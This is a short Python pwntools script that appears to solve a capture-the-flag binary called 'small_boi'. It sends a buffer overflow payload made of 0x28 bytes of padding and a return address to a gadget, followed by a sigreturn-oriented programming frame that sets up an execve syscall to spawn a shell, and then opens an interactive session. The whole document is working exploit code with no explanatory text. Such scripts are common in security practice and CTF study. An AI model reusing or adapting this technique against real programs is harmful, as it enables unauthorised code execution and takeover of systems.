from pwn import *

context.arch = "amd64"

target = process("./small_boi")


payload = b"A" * 0x28
payload += p64(0x0400180)

frame = SigreturnFrame()

frame.rax = 0x3b
frame.rdi = 0x004001ca
frame.rsi = 0x0
frame.rdx = 0x0
frame.rip = 0x00400185
payload += bytes(frame)

target.send(payload)


target.interactive()